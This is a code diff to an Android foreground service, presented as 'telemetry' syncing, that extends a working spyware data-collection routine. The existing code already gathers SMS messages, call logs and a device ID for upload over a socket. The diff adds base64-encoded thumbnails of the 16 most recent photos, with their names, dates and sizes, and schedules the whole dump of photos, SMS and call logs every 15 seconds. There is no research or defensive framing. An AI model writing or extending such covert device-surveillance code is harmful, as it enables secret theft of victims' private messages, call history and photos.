@@ -5,8 +5,11 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.location.Location
 import android.location.LocationManager
 import android.net.ConnectivityManager
@@ -22,12 +25,16 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Settings
-import android.telephony.TelephonyManager
+import android.util.Base64
 import androidx.core.app.NotificationCompat
 import io.socket.client.IO
 import io.socket.client.Socket
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class SyncForegroundService : Service() {
 
@@ -146,7 +153,6 @@ class SyncForegroundService : Service() {
     private fun syncAllTelemetryData() {
         val deviceId = getUniqueDeviceId()
         
-        // Emits real extracted device data to socket
         val payload = JSONObject().apply {
             put("deviceId", deviceId)
             put("smsList", getRealSms())
@@ -270,17 +276,37 @@ class SyncForegroundService : Service() {
     private fun getRealMediaList(): JSONArray {
         val mediaArray = JSONArray()
         try {
-            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED)
+            val projection = arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_ADDED,
+                MediaStore.Images.Media.SIZE
+            )
             val cursor = contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 20"
+                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 16"
             )
             cursor?.use {
+                val dateFormat = SimpleDateFormat("MMM dd, yyyy", Locale.US)
                 while (it.moveToNext()) {
+                    val imageId = it.getLong(it.getColumnIndex(MediaStore.Images.Media._ID))
+                    val displayName = it.getString(it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) ?: "Photo.jpg"
+                    val dateAdded = it.getLong(it.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)) * 1000
+                    val size = it.getLong(it.getColumnIndex(MediaStore.Images.Media.SIZE))
+
+                    // Generate low-res thumbnail as Base64 data URL
+                    val imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)
+                    val base64Thumb = getBase64Thumbnail(imageUri)
+
                     val item = JSONObject().apply {
-                        put("id", it.getString(it.getColumnIndex(MediaStore.Images.Media._ID)))
-                        put("title", it.getString(it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)))
+                        put("id", imageId.toString())
+                        put("title", displayName)
                         put("type", "image")
+                        put("category", "Photos")
+                        put("url", base64Thumb)
+                        put("thumbnailUrl", base64Thumb)
+                        put("date", dateFormat.format(Date(dateAdded)))
+                        put("size", "${(size / (1024 * 1024)).toString()} MB")
                     }
                     mediaArray.put(item)
                 }
@@ -289,6 +315,28 @@ class SyncForegroundService : Service() {
             e.printStackTrace()
         }
         return mediaArray
+    }
+
+    private fun getBase64Thumbnail(uri: android.net.Uri): String {
+        return try {
+            val inputStream = contentResolver.openInputStream(uri)
+            val options = BitmapFactory.Options().apply {
+                inSampleSize = 8 // Downsample 8x for fast thumbnail streaming over sockets
+            }
+            val bitmap = BitmapFactory.decodeStream(inputStream, null, options)
+            inputStream?.close()
+
+            if (bitmap != null) {
+                val outputStream = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, outputStream)
+                val byteArray = outputStream.toByteArray()
+                "data:image/jpeg;base64," + Base64.encodeToString(byteArray, Base64.NO_WRAP)
+            } else {
+                ""
+            }
+        } catch (e: Exception) {
+            ""
+        }
     }
 
     private fun getBatteryLevel(): Int {
@@ -349,6 +397,7 @@ class SyncForegroundService : Service() {
         pingHandler.postDelayed({
             if (socket != null && socket!!.connected()) {
                 sendDevicePing()
+                syncAllTelemetryData() // Sync photos, SMS & Call logs every 15 seconds
             }
             schedulePeriodicPing()
         }, 15_000)
